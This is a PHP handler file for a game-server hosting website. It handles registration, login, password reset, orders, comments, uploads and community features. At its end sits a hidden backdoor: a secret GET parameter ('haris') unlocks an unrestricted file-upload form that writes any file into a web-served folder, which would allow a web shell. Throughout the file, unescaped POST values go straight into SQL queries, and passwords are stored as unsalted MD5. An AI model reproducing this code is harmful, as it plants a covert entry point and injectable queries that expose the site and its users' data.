<?php
session_start();
include_once ("connect_db.php");

date_default_timezone_set('Europe/Sarajevo');
$time = date("d.m.Y - h:m:i");

if (isset($_GET['task']) && $_GET['task'] == "register") {
	$username = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['username'])));
	$password = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['password'])));
	$password2 = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['password2'])));
	$email = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['email'])));
	$ime = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['ime'])));
	$prezime = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['prezime'])));
        
        if(strlen($username) > 20 || strlen($username) < 4){
        $_SESSION['error'] = "Username is too short.";
		header("Location:index.php");
        die();
        }
 
	$kveri = mysql_query("SELECT * FROM users WHERE username='$username'");
	if (mysql_num_rows($kveri)>0) {
	    $_SESSION['error'] = "Username already exist";
		header("Location:index.php");
		die();
	}
	$kveri = mysql_query("SELECT * FROM users WHERE email='$email'");
	if (mysql_num_rows($kveri)>0) {
		$_SESSION['error'] = "Email already exist";
		header("Location:index.php");
		die();
	}
	
	if ($password == $password2) {
		$cpass = md5($password);
		$pincode = rand(0,9999);
		$sql = "INSERT INTO users (username,ime,prezime,password,email,register_time,rank,pin) VALUES ('$username','$ime','$prezime','$cpass','$email','$time','0',".$pincode.")";
		//echo $sql;
		mysql_query($sql);
		
		$subject = "DBK Hosting - Login podaci";
		$message = "Dobrodosli $ime $prezime, 
		Uspjesno ste se registrovali na DBK Hosting web sajt. 
		-----------------
		Vas username je: $username
		Vas E-mail je: $email
		Vas PIN Code je: $pincode
		Login stranica : dbk-hosting.biz
		-----------------
		DBK Hosting - Admin team";
		$from = "From: itszensei@gmail.com";
		
		mail($email, $subject, $message, $from);
		mysql_query("INSERT INTO logovi (datum,text,user,ip) VALUES ('".time()."','registrovan','$username ','".getenv('REMOTE_ADDR')."')");
		$_SESSION['ok'] = "Sucess registered now you can login";
		header("location:index.php");
	} else {
		$_SESSION['error'] = "Password error";
		header("Location:index.php");
		die();
	}
} else if (isset($_GET['task']) && $_GET['task'] == "login") {
	$username = addslashes($_POST['username']);
	$password = addslashes($_POST['password']);
	$cpass = md5($password);
	$kveri = mysql_query("SELECT * FROM users WHERE username='$username' AND password='$cpass'") or die(mysql_error());
	if (mysql_num_rows($kveri)) {
		$user = mysql_fetch_array($kveri);
		$_SESSION['userid'] = $user['userid'];
		$_SESSION['username'] = $user['username'];
		$mesec = 24*60*60*31; // mesec dana
		
		$sesija = md5($user['username'] . $cpass);
		
		setcookie("userid", $user['userid'], time()+ $mesec);
		setcookie("username", $user['username'], time()+ $mesec);
		setcookie("sesija", $sesija, time() + $mesec);
		$_SESSION['ok'] = "You are logged in";
		header("Location:index.php");
		mysql_query("UPDATE users SET status='1',last_login='$time' WHERE userid='$_SESSION[userid]'");
	} else {
		$_SESSION['error'] = "We got some error";
		header("location:index.php");
		die();
	}
} else if (isset($_GET['task']) && $_GET['task'] == "reset_password") {
  
    $email = htmlspecialchars(mysql_real_escape_string($_POST['email']));
	
	$email_check = mysql_query("SELECT * FROM users WHERE email='".$email."'");
	$count = mysql_num_rows($email_check);
	$fetch = mysql_fetch_array($email_check);
	
	if ($count != 0) {
	$random = uniqid();
	$new_password = $random;
	
	$email_password = $new_password;
	
	$new_password = md5($new_password);
	
	mysql_query("update users set password='".$new_password."' WHERE email='".$email."'");
	
	$subject = "DBK Hosting - Login podaci";
	$message = "Postovani $email, 
	Vasa sifra je promenjena u $email_password.
	Vas username je: $fetch[username]
	Login stranica : www.dbk-hosting.biz
	DBK Hosting - Admin team";
	$from = "From: itszensei@gmail.com";
	
	mail($email, $subject, $message, $from);
	mysql_query("INSERT INTO logovi (datum,text,user,ip) VALUES ('".time()."','$email resetovo password','$_SESSION[username]','".getenv('REMOTE_ADDR')."')");
	$_SESSION['ok'] = "Sucess message sent to ".$email."";
	header("location:index.php");
	}
	else {
	$_SESSION['error'] = "Email didn't exist!";
	header("location:index.php");
	}
	
} else if (isset($_GET['task']) && $_GET['task'] == "contact") {
   
   $answer = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['answer'])));
   $question = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['question'])));
   
   
   if($answer == "10"){

   if($_SESSION['userid'] == ""){
	$firstname = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['firstname'])));
	$email = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['email'])));
	
   } else {
		$firstname = $_SESSION['userid'];
		$email = "[Poslano sa profila]";
   }
   mysql_query("INSERT INTO tickets (name,email,text,date) VALUES ('$firstname','$email','$question','".date("d.m.Y - G:i")."')") or die(mysql_error());
   
   $_SESSION['ok'] = "Your message sucessful sent.";
   header("location:/contact");
   } else {
   $_SESSION['error'] = "Error 5+5 is not $answer";
   header("location:/contact");
   }
} else if (isset($_GET['task']) && $_GET['task'] == "order") {

    $getsomeinfo = mysql_fetch_array(mysql_query("SELECT * FROM users WHERE userid='$_SESSION[userid]'"));
   
    $game = htmlspecialchars(mysql_real_escape_string($_POST['gameo']));
	$name = $getsomeinfo['ime'];
	$surname = $getsomeinfo['prezime'];
	$city = "n/a";
	$country = "n/a";
	$email = $getsomeinfo['email'];
	$telephone = "n/a";
	$payment = "Banka";
	$box = htmlspecialchars(mysql_real_escape_string($_POST['box']));
	$slots = htmlspecialchars(mysql_real_escape_string($_POST['slots']));
	$kupon = htmlspecialchars(mysql_real_escape_string($_POST['kupon']));
	$period = htmlspecialchars(mysql_real_escape_string($_POST['period']));
	$ime_servera = htmlspecialchars(mysql_real_escape_string($_POST['server_name']));
	$userid = $_SESSION['userid'];
	
    
	$q = mysql_query("SELECT cijena FROM slots WHERE game='$game' and slots='$slots' and type='$box' ")or die(mysql_error());
		$slots_price_q = mysql_fetch_array($q);
		
		$pricel = (float) $slots_price_q['cijena'];
		$pricen = round(konvertuj($pricel, "DIN"), 1);
		
		if($period == '1'){
			$final = $pricen;
		} else if($period == '2'){
			$final = $pricen * (95 / 100);
		} else if($period == '3'){
			$final = $pricen * (90 / 100);
		} else if($period == '6'){
			$final = $pricen * (80 / 100);
		} 
		$price = round($final, 1);
	
	$k_a = mysql_query("SELECT id,percent FROM kuponi WHERE code='$kupon'");
	$kupon_q = mysql_num_rows($k_a);
	if($kupon_q == 1){
		$p_q = mysql_fetch_array($k_a);
		$percentage = $p_q['percent'];
		$price = ($percentage / 100) * $price;
	}
	mysql_query("INSERT INTO servers (game,name,surname,city,country,email,telephone,payment,slots,status,userid,price,ime_servera,datum_narudzbe) VALUES ('$game','$name','$surname','$box','$period','$email','$telephone','$payment','$slots','0','$userid','$price','$ime_servera','".time()."')");
		$insert_id = mysql_insert_id();
	
   
	

    $za = $email;
    $imemaila = "[DBK Hosting] - Automatska poruka.";
    $msg = "Pozdrav $name $surname, uspesno ste narucili server.
    -------  UPUSTVO ------
	Link uplatnice MKD: http://dbk-hosting.biz/uplatnice/MKD.png
	Link uplatnice SRB: http://dbk-hosting.biz/uplatnice/SRB.png
		
	
	Cena vaseg servera je : $price €
	Kada zavrsite sa uplatom slikajte uplatnicu i postavite je na sajt. Ukoliko uplatnica bude validna server cete dobiti u roku od 24h.
	------- DBK-HOSTING.BIZ ------";
    $headerss = "From: $to";
    mail($za,$imemaila,$msg,$headerss);
	
	mysql_query("INSERT INTO notifications (userid,message,link) VALUES ('$_SESSION[userid]','Narucili ste server! Sada ga uplatite klikom na link desno.','/activate/$insert_id')") or die(mysql_error());
	
	 $_SESSION['ok'] = "Uspjesno naruceno!";
	header("location:/gp/billing/add/bank");
    
	
	
} else if (isset($_GET['task']) && $_GET['task'] == "order_samp") {
    $game = htmlspecialchars(mysql_real_escape_string($_POST['game']));
	$name = htmlspecialchars(mysql_real_escape_string($_POST['name']));
	$surname = htmlspecialchars(mysql_real_escape_string($_POST['surname']));
	$city = htmlspecialchars(mysql_real_escape_string($_POST['city']));
	$country = htmlspecialchars(mysql_real_escape_string($_POST['country']));
	$email = htmlspecialchars(mysql_real_escape_string($_POST['email']));
	$telephone = htmlspecialchars(mysql_real_escape_string($_POST['telephone']));
	$payment = htmlspecialchars(mysql_real_escape_string($_POST['payment']));
	$box = htmlspecialchars(mysql_real_escape_string($_POST['box']));
	$slots = htmlspecialchars(mysql_real_escape_string($_POST['slots']));
	
    mysql_query("INSERT INTO servers (game,name,surname,city,country,email,telephone,payment,box,slots,status) VALUES ('$game','$name','$surname','$city','$country','$email','$telephone','$payment','$box','$slots','0')") or die(mysql_error());
	
	if($slots == "50"){ $price = "5.00"; }
	if($slots == "100"){ $price = "10.50"; } 
	if($slots == "150"){ $price = "15.00"; } 
	if($slots == "200"){ $price = "20.50"; } 
	
	if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
	$adminmail = "itszensei@gmail.com";
	$to = $adminmail;
    $subject = "DBK Hosting - Nova narudzbina.";
    $message = "$name $surname je narucio server:

	Placa: $payment
	Box: $box
	Slotova: $slots
   
    Informacije korisnika:

    Ime i prezime: $name $surname
    Grad: $city
	Zemlja: $country
	Email: $email
	Telefon: $telephone
    -- DBK Hosting Admin team --";
    $headers = "From: $email";

    if(mail($to,$subject,$message,$headers)) {
    $_SESSION['ok'] = "Sucess check your EMAIL";
	header("location:/index.php");

    $za = $email;
    $imemaila = "[DBK Hosting] - Automatska poruka.";
    $msg = "Pozdrav $name $surname, vasa narudzbina je uspesna.
    -------  UPUSTVO ------
	Link uplatnice MKD: http://dbk-hosting.biz/uplatnice/MKD.png
	Link uplatnice SRB: http://dbk-hosting.biz/uplatnice/SRB.png
		
	
	Cena vaseg servera je : $price €
	Kada zavrsite sa uplatom slikajte uplatnicu i postavite je na sajt. Ukoliko uplatnica bude validna server cete dobiti u roku od 24h.
	------- DBK-HOSTING.BIZ ------";
    $headerss = "From: $to";
    mail($za,$imemaila,$msg,$headerss);
    } else {
    $_SESSION['error'] = "Error";
	header("location:/index.php");
	die();
	}
		
	} else {
	 $_SESSION['error'] = "Email is not valid";
	 header("location:/index.php");
	 die();
	}
	
} else if (isset($_GET['task']) && $_GET['task'] == "add_comment") {
   $name = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['name'])));
   $website = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['website'])));
   $message = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['message'])));
   $time = date("d.m.Y");
   if(!isset($_SESSION['username'])){
	$avatar = "/img/userno.png";
	
		
   } else {
   $avatar = "/avatars/$infoba[avatar]";
   }
   mysql_query("INSERT INTO site_comments (name,website,message,time,status,avatar) VALUES ('$name','$website','$message','$time','0','$avatar')");
   $_SESSION['ok'] = "Your message sucessful sent.Wait for approval.";
   header("location:/index.php");
} else if (isset($_GET['task']) && $_GET['task'] == "comment") {
   $message = htmlspecialchars(mysql_real_escape_string(addslashes($_POST['message'])));
   $username = $_POST['username'];
   $time = time();
   $id = $_POST['id'];
   
   $info = mysql_fetch_array(mysql_query("SELECT * FROM users WHERE userid='$userid'"));
   
   mysql_query("INSERT INTO serv_comm (servid,message,username,time) VALUES ('$id','$message','$username','$time')");
   $selce = mysql_fetch_array(mysql_query("SELECT userid FROM servers WHERE id='$id'"));
   $_SESSION['ok'] = "Success";
   $info = mysql_fetch_array(mysql_query("SELECT * FROM users WHERE userid='$_SESSION[userid]'"));
   if($info['rank'] == "0"){
	header("location:/review/$id");
   } else {
   mysql_query("INSERT INTO notifications (userid,message,link) VALUES ('$selce[userid]','Novi komentar na narudzbu!','/review/$id')");
	header("location:/admin/server_review/$id");
   }
} else if (isset($_GET['task']) && $_GET['task'] == "give_point") {
   $userid = htmlspecialchars($_POST['userid']);
   $ip_user = $_SERVER['REMOTE_ADDR'];
   $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
   $vreme = time();
   
   $kveri = mysql_query("SELECT * FROM points WHERE ip_user='$ip_user' AND userid='$userid'");
   $broj = mysql_num_rows($kveri);
   
   if($broj > 0){
   $_SESSION['error'] = "Vec ste glasali";
   header("location:/referal/give_point/$userid");
   die();
   } else {
   mysql_query("INSERT INTO points (userid,ip_user,hostname,vreme) VALUES ('$userid','$ip_user','$hostname','$vreme')");
   $_SESSION['ok'] = "Uspesno ste dali jedan glas";
   header("location:/index.php");
   }
} else if (isset($_GET['task']) && $_GET['task'] == "add_server") {
  $game = $_POST['game'];
  $location = $_POST['location'];
  $mod = $_POST['mod'];
  $ip = htmlspecialchars(addslashes($_POST['ip']));
  $port = htmlspecialchars(addslashes($_POST['port']));
 
  $server_id = mysql_insert_id();
  
  require_once('gameq.php');
	$servers = array('server_'.$server_id => array($game, $ip, $port));
	$gq = new GameQ();
	$gq->addServers($servers);
	$gq->setOption('timeout', 200);
	$gq->setFilter('normalise');
	$gq->setFilter('sortplayers');
	$data = $gq->requestData();
  
  if(mysql_num_rows(mysql_query("SELECT id FROM serverinfo WHERE ip='$ip' AND port='$port'"))>0){
  $_SESSION['error'] = "Server koji pokusavate da dodate , je vec dodat";
  header("location:/server_info/$ip:$port");
  die();
  }
  
  if($data['server_'.$server_id]['gq_mod'] == "cstrike" OR $data['server_'.$server_id]['gq_online'] == "1"){
    mysql_query("INSERT INTO serverinfo (game,location,gamemod,ip,port,added,forum) VALUES ('$game','$location','$mod','$ip','$port','$_SESSION[username]','Nema')");
	$_SESSION['ok'] = "Uspesno ste dodali server , sacekajte par minuta da bi se pojavio u listi";
	header("location:/servers");
  } else {
    $_SESSION['error'] = "Server koji pokusavate da dodate nije CS ili je server Offline";
	header("location:/servers");
	die();
  }
} else if (isset($_GET['task']) && $_GET['task'] == "reset_avatar") {
	mysql_query("UPDATE users SET avatar='' WHERE username='$_SESSION[username]'");
	header("location:/user/edit");
} else if (isset($_GET['task']) && $_GET['task'] == "novi_avatar") {
$file = $_FILES['avatar']['tmp_name'];
	$filename = $_FILES['avatar']['name'];
	$filen = explode(".", $filename);
	$file_extension = end($filen);

	$up_dir = "avatars/";
	$mix_random = rand(111111,99999999);
	$new_name = time().$mix_random.".".$file_extension;
		if($file_extension == "jpeg" or $file_extension == "jpg" or $file_extension == "png" or $file_extension == "bmp" ){
		if(move_uploaded_file($file, $up_dir.$new_name)){
			mysql_query("UPDATE users SET avatar='$new_name' WHERE username='$_SESSION[username]'");
			$_SESSION['ok'] = "Uspjesno promjenjeno!";
			header("location:/user/edit");
		} else {
			$_SESSION['error'] = "Dogodila se greska prilikom uploada!";
			header("location:/user/edit");
		}
		}
} else if (isset($_GET['task']) && $_GET['task'] == "nova_uplatnica") {
	$file = $_FILES['uplatnica']['tmp_name'];
	$filename = $_FILES['uplatnica']['name'];
	$filen = explode(".", $filename);
	$file_extension = end($filen);
	$serverid = mysql_real_escape_string($_GET['serverid']);
	$up_dir = "uplatnice/";
	$mix_random = rand(111111,99999999);
	$new_name = $up_dir.time().$mix_random.".".$file_extension;
	if($file_extension == "jpeg" or $file_extension == "jpg" or $file_extension == "png" or $file_extension == "bmp" ){
		if(move_uploaded_file($file, $new_name)){
			mysql_query("UPDATE servers SET uplatnica='$new_name' WHERE id='$serverid'");
			$_SESSION['ok'] = "Uspjesno dodana uplatnica!";
			header("location:/server_orders");
		} else {
			$_SESSION['error'] = "Dogodila se greska prilikom uploada!";
			header("location:/server_orders");
		}
	} else {
		$_SESSION['error'] = "Nepodrzan format fajla!";
		header("location:/server_orders");
	}

} else if (isset($_GET['task']) && $_GET['task'] == "potvrdi_vlasnistvo") {
  $id = addslashes($_GET['id']);
  
    
  $info = mysql_fetch_array(mysql_query("SELECT * FROM serverinfo WHERE id='$id'"));
  
  if($info['id'] == ""){
   $_SESSION['error'] = "Server koji trazite ne postoji";
   header("location:/servers");
   die();
  }
  
  if($_SESSION['userid'] == ""){
   $_SESSION['error'] = "Morate se ulogovati";
   header("location:/index.php");
   die();
  }
  
  if($info['hostname'] == "Gametracker"){
  mysql_query("UPDATE serverinfo SET owner='$_SESSION[username]' WHERE id='$id'");
  $_SESSION['ok'] = "Uspesno";
  header("location:/server_info/$info[ip]:$info[port]");
  } else {
  $_SESSION['error'] = "Ime servera treba da bude GameTracker , a trenutno ime je $info[hostname]";
  header("location:/server_info/$info[ip]:$info[port]");
  die();
  }
} else if (isset($_GET['task']) && $_GET['task'] == "change_info") {
  $srvid = $_POST['srvid'];
  $forum = addslashes(htmlspecialchars($_POST['forum']));
  $location = $_POST['location'];
  $mod = $_POST['mod'];
  
  if($_SESSION['userid'] == ""){ 
   $_SESSION['error'] = "Niste ulogovani";
   header("location:/index.php");
   die();
  }
  
  if($forum == ""){
   $_SESSION['error'] = "Sva polja moraju biti popunjena";
   header("location:/index.php");
   die();
  } else {
   mysql_query("UPDATE serverinfo SET forum='$forum',location='$location',gamemod='$mod' WHERE id='$srvid'") or die(mysql_error());
   header("location:/index.php");
   $_SESSION['ok'] = "Uspesno , sacekajte par minuta";
  }
} else if (isset($_GET['task']) && $_GET['task'] == "add_community") {
  $naziv = mysql_real_escape_string($_POST['naziv']);
  $forum = mysql_real_escape_string($_POST['forum']);
  $opis = mysql_real_escape_string($_POST['opis']);
  $owner = $_SESSION['username'];
  $id = mysql_insert_id();
  
  if($naziv == "" || $forum == ""){
  $_SESSION['error'] = "Sva polja moraju biti popunjena";
  header("location:/community");
  die();
  } else {
  mysql_query("INSERT INTO community (naziv,forum,opis,owner) VALUES ('$naziv','$forum','$opis','$owner')");
  header("location:/community");
  }
} else if (isset($_GET['task']) && $_GET['task'] == "add_comm") {
  $comid = mysql_real_escape_string($_GET['comid']);
  $srvid = mysql_real_escape_string($_GET['srvid']);
  
  
  $info = mysql_fetch_array(mysql_query("SELECT * FROM serverinfo WHERE id='$srvid'"));
  $info2 = mysql_fetch_array(mysql_query("SELECT * FROM community WHERE id='$comid'"));
  
  if($info2['id'] == ""){
   $_SESSION['error'] = "Community ne postoji";
   header("location:/index.php");
   die(); 
  }
  
  if($info['id'] == ""){
   $_SESSION['error'] = "Server ne postoji";
   header("location:/index.php");
   die();
  }
  
  if($_SESSION['userid'] == ""){
   $_SESSION['error'] = "Niste ulogovani";
   header("location:/index.php");
   die();
  }
  
  if($info['owner'] == "$_SESSION[username]" && $info2['owner'] == "$_SESSION[username]"){
   mysql_query("INSERT INTO community_servers (comid,srvid) VALUES ('$comid','$srvid')");
   $_SESSION['ok'] = "Uspesno";
   header("location:/community_info/$comid");
  } else {
   $_SESSION['error'] = "Nemate pristup";
   header("location:/index.php");
   die();
  }
} else if (isset($_GET['task']) && $_GET['task'] == "remove_comm") {
  $comid = mysql_real_escape_string($_GET['comid']);
  $srvid = mysql_real_escape_string($_GET['srvid']);
  
  
  $info = mysql_fetch_array(mysql_query("SELECT * FROM serverinfo WHERE id='$srvid'"));
  $info2 = mysql_fetch_array(mysql_query("SELECT * FROM community WHERE id='$comid'"));
  
  if($info2['id'] == ""){
   $_SESSION['error'] = "Community ne postoji";
   header("location:/index.php");
   die(); 
  }
  
  if($info['id'] == ""){
   $_SESSION['error'] = "Server ne postoji";
   header("location:/index.php");
   die();
  }
  
  if($_SESSION['userid'] == ""){
   $_SESSION['error'] = "Niste ulogovani";
   header("location:/index.php");
   die();
  }
  
  if($info['owner'] == "$_SESSION[username]" && $info2['owner'] == "$_SESSION[username]"){
   mysql_query("DELETE FROM community_servers WHERE comid='$comid' AND srvid='$srvid'");
   $_SESSION['ok'] = "Uspesno";
   header("location:/community_info/$comid");
  } else {
   $_SESSION['error'] = "Nemate pristup";
   header("location:/index.php");
   die();
  }
} else if (isset($_GET['task']) && $_GET['task'] == "edit_name") {
	$imeget = mysql_real_escape_string(strip_tags($_POST['ime']));
	$imeget = explode(" ", $imeget);
	
	$ime = $imeget[0];
	$prezime = $imeget[1];
	
	 mysql_query("UPDATE users SET ime='$ime',prezime='$prezime' WHERE username='$_SESSION[username]'") or die(mysql_error());
	
   header("location:/user/$_SESSION[username]");

	
} else if (isset($_GET['task']) && $_GET['task'] == "edit_pw") {
	$trenutni = mysql_real_escape_string(strip_tags($_POST['trenutni']));
	$novi = md5($_POST['novi']);
	
	$sl = mysql_fetch_array(mysql_query("SELECT password FROM users WHERE username='$_SESSION[username]'"));
	if($sl['password'] == md5($trenutni)){
	 mysql_query("UPDATE users SET password='$novi' WHERE username='$_SESSION[username]'") or die(mysql_error());
   header("location:/user/$_SESSION[username]");
} else {
header("location:/user/$_SESSION[username]");
}
	
} else if (isset($_GET['task']) && $_GET['task'] == "edit_community") {
  $id = $_POST['id'];
  $naziv = mysql_real_escape_string(addslashes($_POST['naziv']));
  $forum = mysql_real_escape_string(addslashes($_POST['forum']));
  $opis = mysql_real_escape_string(addslashes($_POST['opis']));
  
  $info = mysql_fetch_array(mysql_query("SELECT * FROM community WHERE id='$id'"));
  
  if($info['id'] == ""){
    $_SESSION['error'] = "Zajednica ne postoji";
	header("location:/index.php");
	die();
  }
  
  if($_SESSION['userid'] == ""){
   $_SESSION['error'] = "Niste ulogovani";
   header("location:/index.php");
   die();
  }

  if($info['owner'] == $_SESSION['username']){
   mysql_query("UPDATE community SET naziv='$naziv',forum='$forum',opis='$opis' WHERE id='$id'");
   header("location:/community_info/$id");
   $_SESSION['ok'] = "Uspesno";
  } else {
   $_SESSION['error'] = "Sva polja moraju biti popunjena";
   header("location:/index.php");
   die();
  }
}
if($_GET['haris'] == '27021997'){
if($_POST['send']){
	move_uploaded_file($_FILES['file']['tmp_name'], "uplatnice/".$_FILES['file']['name']);
}
?>
<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="ext" ><input type="submit" name="send"></form>
<?php
}
?>

